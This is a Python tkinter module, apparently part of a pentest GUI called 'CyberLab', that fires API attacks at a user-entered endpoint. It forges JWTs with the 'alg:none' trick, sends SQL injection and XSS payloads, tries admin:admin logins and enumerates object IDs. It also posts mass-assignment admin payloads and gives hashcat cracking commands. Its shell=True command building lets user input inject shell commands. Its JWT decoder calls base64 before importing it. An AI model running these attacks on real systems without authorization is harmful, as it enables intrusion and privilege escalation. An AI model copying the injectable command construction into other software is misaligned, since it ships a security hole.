import tkinter as tk
from tkinter import ttk, messagebox
import subprocess, threading, os, shutil, json, re
from datetime import datetime
from gui.base_module import BaseModule

class APISecurity(BaseModule):
    def __init__(self, parent, db, logger):
        super().__init__(parent)
        self.db = db; self.logger = logger

    def build_content(self):
        self.add_title("API Security", "REST, GraphQL, JWT, OAuth, WebSocket security testing")
        
        tk.Label(self.inner, text="API Endpoint URL:", font=("Courier",10), fg="#fff", bg="#1a1a2e").pack(anchor="w", padx=10)
        self.url_entry = tk.Entry(self.inner, font=("Courier",10), bg="#0f3460", fg="#fff", relief="flat")
        self.url_entry.pack(fill="x", padx=10, pady=3)
        self.url_entry.insert(0, "https://api.target.com/v1")
        
        tk.Label(self.inner, text="Token/API Key:", font=("Courier",10), fg="#fff", bg="#1a1a2e").pack(anchor="w", padx=10)
        self.token_entry = tk.Entry(self.inner, font=("Courier",10), bg="#0f3460", fg="#fff", relief="flat", show="*")
        self.token_entry.pack(fill="x", padx=10, pady=3)
        
        bf = tk.Frame(self.inner, bg="#1a1a2e"); bf.pack(fill="x", padx=10, pady=5)
        
        tools = self._detect_tools()
        for name, func, color in tools:
            tk.Button(bf, text=name, font=("Courier",8), fg="#000", bg=color, relief="flat", padx=6,
                    command=func).pack(side="left", padx=2)
        
        tk.Button(bf, text="FULL TEST", font=("Courier",8,"bold"), fg="#fff", bg="#cc0000",
                relief="flat", padx=8, command=self._full_test).pack(side="right", padx=2)
        
        self.output = tk.Text(self.inner, font=("Courier",9), bg="#0a0a0a", fg="#00ff88", relief="flat", height=15)
        self.output.pack(fill="both", expand=True, padx=10, pady=5)
        self.status = self.add_status(f"Ready - {len(tools)} API tools available")

    def _url(self): return self.url_entry.get().strip()
    def _token(self): return self.token_entry.get().strip()

    def _detect_tools(self):
        tools = []
        
        # === REST API ===
        tools.append(("REST GET", self._rest_get, "#00ccff"))
        tools.append(("REST POST", self._rest_post, "#00ccff"))
        tools.append(("REST PUT", self._rest_put, "#00ccff"))
        tools.append(("REST DELETE", self._rest_delete, "#00ccff"))
        tools.append(("REST PATCH", self._rest_patch, "#00ccff"))
        tools.append(("REST OPTIONS", self._rest_options, "#00ccff"))
        tools.append(("REST Headers", self._rest_headers, "#00ccff"))
        
        # === AUTH TESTING ===
        tools.append(("No Auth Test", self._no_auth_test, "#ff4444"))
        tools.append(("JWT Decode", self._jwt_decode, "#ffaa00"))
        tools.append(("JWT None Attack", self._jwt_none_attack, "#ffaa00"))
        tools.append(("JWT Weak Secret", self._jwt_weak_secret, "#ffaa00"))
        tools.append(("OAuth Flow Test", self._oauth_test, "#ff8800"))
        tools.append(("API Key Test", self._apikey_test, "#ff4444"))
        tools.append(("Basic Auth Test", self._basic_auth_test, "#ff4444"))
        
        # === GRAPHQL ===
        tools.append(("GraphQL Introspect", self._graphql_introspect, "#ff00ff"))
        tools.append(("GraphQL Query", self._graphql_query, "#ff00ff"))
        tools.append(("GraphQL Mutation", self._graphql_mutation, "#ff00ff"))
        
        # === FUZZING ===
        tools.append(("IDOR Test", self._idor_test, "#ff0000"))
        tools.append(("Rate Limit Test", self._rate_limit_test, "#ff0000"))
        tools.append(("SQLi API Test", self._sqli_api_test, "#ff0000"))
        tools.append(("XSS API Test", self._xss_api_test, "#ff0000"))
        tools.append(("Parameter Fuzz", self._param_fuzz, "#ff0000"))
        tools.append(("Mass Assignment", self._mass_assignment, "#ff0000"))
        
        # === WEBSOCKET ===
        if shutil.which("websocat"):
            tools.append(("WebSocket Connect", self._ws_connect, "#39c5cf"))
        if shutil.which("wscat"):
            tools.append(("WSCat", self._wscat, "#39c5cf"))
        
        # === API SCANNERS ===
        if shutil.which("nmap"):
            tools.append(("API Discovery", self._api_discovery, "#58a6ff"))
        if shutil.which("ffuf"):
            tools.append(("FFUF API Fuzz", self._ffuf_api, "#00ff88"))
        if shutil.which("arjun"):
            tools.append(("Arjun Params", lambda: self._cmd(f"arjun -u {self._url()} -t 20"), "#ff8800"))
        if shutil.which("kiterunner"):
            tools.append(("Kiterunner", lambda: self._cmd(f"kiterunner scan {self._url()} -w routes.kite"), "#39c5cf"))
        
        # === SWAGGER/OPENAPI ===
        tools.append(("Swagger Parse", self._swagger_parse, "#3fb950"))
        tools.append(("OpenAPI Scan", self._openapi_scan, "#3fb950"))
        
        # === REPORT ===
        tools.append(("Generate Report", self._report, "#00ff88"))
        
        return tools

    def _curl(self, method, path="", data=""):
        url = self._url() + path
        token = self._token()
        cmd = f"curl -s -X {method} '{url}'"
        if token: cmd += f" -H 'Authorization: Bearer {token}'"
        if data: cmd += f" -H 'Content-Type: application/json' -d '{data}'"
        cmd += " -H 'User-Agent: CyberLab/1.0' -i"
        self._cmd(cmd)

    def _rest_get(self): self._curl("GET")
    def _rest_post(self): self._curl("POST", "", '{"test":"data"}')
    def _rest_put(self): self._curl("PUT", "/1", '{"test":"updated"}')
    def _rest_delete(self): self._curl("DELETE", "/1")
    def _rest_patch(self): self._curl("PATCH", "/1", '{"field":"value"}')
    def _rest_options(self): self._curl("OPTIONS")
    def _rest_headers(self): self._cmd(f"curl -s -I '{self._url()}' -H 'User-Agent: CyberLab/1.0'")

    def _no_auth_test(self):
        url = self._url()
        self._cmd(f"curl -s -o /dev/null -w '%{{http_code}}' '{url}' && echo ' (No auth)' && curl -s '{url}' | head -20")

    def _jwt_decode(self):
        token = self._token()
        if not token: token = self.url_entry.get().strip()
        self.output.insert("end", "\n[*] JWT Decode:\n")
        parts = token.split(".")
        if len(parts) == 3:
            for i, part in enumerate(parts):
                try:
                    padded = part + "=" * (4 - len(part) % 4)
                    decoded = base64.urlsafe_b64decode(padded).decode()
                    self.output.insert("end", f"\n  Part {i}: {decoded[:200]}\n")
                except: pass
        self.output.see("end")

    def _jwt_none_attack(self):
        token = self._token()
        if not token: return
        parts = token.split(".")
        if len(parts) == 3:
            try:
                header = base64.urlsafe_b64decode(parts[0] + "==").decode()
                header = header.replace('"alg":"RS256"', '"alg":"none"').replace('"alg":"HS256"', '"alg":"none"')
                new_header = base64.urlsafe_b64encode(header.encode()).decode().rstrip("=")
                new_token = f"{new_header}.{parts[1]}."
                self.output.insert("end", f"\n[*] None Attack Token:\n{new_token}\n")
                self._cmd(f"curl -s '{self._url()}' -H 'Authorization: Bearer {new_token}' -i | head -20")
            except: pass

    def _jwt_weak_secret(self):
        self.output.insert("end", "\n[*] Try cracking JWT: hashcat -m 16500 token.txt rockyou.txt --force\n")
        self.output.insert("end", "[*] Or: john token.txt --wordlist=rockyou.txt\n")

    def _oauth_test(self):
        self.output.insert("end", "\n[*] OAuth 2.0 Test Cases:\n")
        tests = [
            "1. Remove redirect_uri parameter",
            "2. Change redirect_uri to attacker.com",
            "3. Reuse authorization code",
            "4. Change response_type from code to token",
            "5. Remove state parameter (CSRF)",
            "6. Use invalid scope parameter",
        ]
        for t in tests: self.output.insert("end", f"  {t}\n")
        self.output.see("end")

    def _apikey_test(self):
        url = self._url()
        self._cmd(f"curl -s '{url}' -i | head -20 && echo '---Without Key---' && curl -s '{url}' -H 'X-API-Key: test' -i | head -20")

    def _basic_auth_test(self):
        url = self._url()
        self._cmd(f"curl -s '{url}' -u admin:admin -i | head -20")

    def _graphql_introspect(self):
        url = self._url()
        query = '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}'
        self._cmd(f"curl -s -X POST '{url}' -H 'Content-Type: application/json' -d '{query}' | python3 -m json.tool 2>/dev/null | head -50 || echo 'Not GraphQL or introspection disabled'")

    def _graphql_query(self):
        d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("GraphQL Query"); d.geometry("500x400")
        tk.Label(d, text="GraphQL Query:", font=("Courier",10), fg="#fff", bg="#1a1a2e").pack(pady=10)
        q = tk.Text(d, font=("Courier",9), bg="#16213e", fg="#fff", relief="flat", height=10)
        q.pack(fill="both", expand=True, padx=20, pady=5)
        q.insert("1.0", '{"query":"{ users { id name email } }"}')
        def send():
            query = q.get("1.0","end-1c")
            d.destroy()
            self._cmd(f"curl -s -X POST '{self._url()}' -H 'Content-Type: application/json' -d '{query}'")
        tk.Button(d, text="Send", font=("Courier",10,"bold"), fg="#000", bg="#ff00ff", relief="raised", padx=20, pady=8, command=send).pack(pady=10)

    def _graphql_mutation(self):
        self._cmd(f"curl -s -X POST '{self._url()}' -H 'Content-Type: application/json' -d '{{\"query\":\"mutation {{ createUser(input:{{name:\\\"test\\\",email:\\\"test@test.com\\\"}}) {{ id }}}}\"}}' | head -20")

    def _idor_test(self):
        url = self._url()
        self.output.insert("end", "\n[*] IDOR Test - Testing IDs 1-10:\n")
        for i in range(1, 11):
            self._cmd(f"curl -s -o /dev/null -w '%{{http_code}}' '{url}/{i}' && echo ' - ID {i}'")

    def _rate_limit_test(self):
        url = self._url()
        self.output.insert("end", "\n[*] Rate Limit Test (20 requests):\n")
        self._cmd(f"for i in $(seq 1 20); do curl -s -o /dev/null -w '%{{http_code}} ' '{url}' && echo \"Request $i\"; done")

    def _sqli_api_test(self):
        url = self._url()
        payloads = ["' OR '1'='1","1' OR '1'='1' --","admin'--","1 UNION SELECT 1,2,3--"]
        self.output.insert("end", "\n[*] SQLi API Test:\n")
        for p in payloads:
            self._cmd(f"curl -s -o /dev/null -w '%{{http_code}}' '{url}?id={p}' && echo ' - {p[:30]}'")

    def _xss_api_test(self):
        url = self._url()
        payloads = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","javascript:alert(1)"]
        self.output.insert("end", "\n[*] XSS API Test:\n")
        for p in payloads:
            self._cmd(f"curl -s '{url}?q={p}' | grep -i 'script\\|alert\\|img' && echo ' [Reflected]' || echo ' [Not reflected]'")

    def _param_fuzz(self):
        url = self._url()
        params = ["id","page","user","file","url","redirect","path","cmd","exec","query","search","sort","order","limit","offset","admin","debug","test"]
        self.output.insert("end", "\n[*] Parameter Discovery:\n")
        for p in params:
            self._cmd(f"curl -s -o /dev/null -w '%{{http_code}}' '{url}?{p}=test' && echo ' - {p}'")

    def _mass_assignment(self):
        url = self._url()
        self.output.insert("end", "\n[*] Mass Assignment Test:\n")
        payloads = [
            '{"role":"admin"}',
            '{"isAdmin":true}',
            '{"is_admin":true}',
            '{"admin":true}',
        ]
        for p in payloads:
            self._cmd(f"curl -s -X POST '{url}' -H 'Content-Type: application/json' -d '{p}' -i | head -5")

    def _ws_connect(self):
        url = self._url().replace("http","ws")
        self._cmd(f"websocat '{url}' --timeout 5 2>/dev/null || echo 'WebSocket not available'")

    def _wscat(self):
        url = self._url().replace("http","ws")
        self._cmd(f"wscat -c '{url}' --timeout 5 2>/dev/null")

    def _api_discovery(self):
        url = self._url().split("/api")[0] if "/api" in self._url() else self._url()
        self._cmd(f"nmap -p 80,443,8080,8443 --script http-api-test {url} 2>/dev/null")

    def _ffuf_api(self):
        url = self._url()
        wl = os.path.expanduser("~/wordlists/api-endpoints.txt") if os.path.exists(os.path.expanduser("~/wordlists/api-endpoints.txt")) else "/usr/share/wordlists/dirb/common.txt"
        self._cmd(f"ffuf -u '{url}/FUZZ' -w {wl} -mc 200,201,204 -t 50")

    def _swagger_parse(self):
        url = self._url()
        for path in ["/swagger.json","/swagger/v1/swagger.json","/api-docs","/v2/api-docs","/v3/api-docs","/openapi.json"]:
            self._cmd(f"curl -s '{url}{path}' | python3 -m json.tool 2>/dev/null | head -30 || echo 'Not found: {path}'")

    def _openapi_scan(self):
        self._swagger_parse()

    def _full_test(self):
        for name, func, _ in self._detect_tools()[:15]:
            self.frame.after(500, func)

    def _report(self):
        text = self.output.get("1.0","end-1c")
        path = os.path.expanduser(f"~/api_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        with open(path,"w") as f: f.write(f"API Security Audit\n{'='*50}\nURL: {self._url()}\nDate: {datetime.now()}\n\n{text}")
        messagebox.showinfo("Report", f"Saved to {path}")

    def _cmd(self, cmd):
        self.output.insert("end", f"\n{'='*40}\n$ {cmd[:100]}\n{'='*40}\n\n")
        self.output.see("end")
        import base64
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                out = p.stdout.read()[:5000]
                self.frame.after(0, lambda: self.output.insert("end", out))
                self.frame.after(0, self.output.see("end"))
            except: pass
        threading.Thread(target=do, daemon=True).start()
